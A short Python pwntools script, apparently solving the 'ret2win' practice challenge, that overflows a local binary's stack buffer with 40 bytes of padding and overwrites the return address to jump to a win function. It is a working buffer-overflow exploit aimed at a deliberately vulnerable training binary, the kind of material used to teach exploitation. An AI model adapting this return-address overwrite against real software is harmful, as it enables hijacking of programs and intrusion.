from pwn import *

p = ELF('./ret2win')
r = process('./ret2win')

ret2win = p.symbols['ret2win']
junk = b'X'*40
junk += p64(ret2win)
log.info('ret2win 0x%x' %ret2win)
r.sendline(junk)
r.interactive()